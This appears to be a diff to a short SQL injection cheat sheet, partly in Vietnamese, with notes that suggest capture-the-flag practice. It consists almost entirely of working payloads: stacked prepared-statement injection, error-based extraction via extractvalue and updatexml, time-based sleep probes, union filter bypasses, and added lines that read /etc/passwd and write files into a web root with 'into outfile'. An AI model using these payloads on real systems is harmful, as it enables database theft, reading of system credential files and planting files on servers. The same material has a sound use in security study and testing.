@@ -28,7 +28,7 @@ Use preparestatement to execute query
 ```1'; prepare abc from 73656c65637420666c61672066726f6d20603139313938313039333131313435313460; execute abc```
 
 
-Sử dụng extractvalue: -1' and extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata)))-- -
+Sử dụng extractvalue: -1' and extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata)))-- -
 
 Time base: '1)) union select 1,2,elt((select substr('abc',1,1) from information_schema.schemata limit 0,1)='a',sleep(5))-- -
 
@@ -37,5 +37,11 @@ Sử dụng updateXML: 1',updatexml(1,concat(0x7e,(select database()),0x7e),1))-
 select name from demo where name = 'dasd' union values(char(97)||char(100)||char(109)||char(105)||char(110))
 
 1/**/union/**/values(char(97)||char(100)||char(109)||char(105)||char(110))
+
+# Load file 
+?id=1')) UNION SELECT(select database()),2,3 into outfile "/var/www/html/<web-root>/1.txt";-- -
+
+?id=1')) union select load_file("/etc/passwd"),2,3 into outfile "/var/www/html/<web-root>/2.txt";-- -
+
 
 
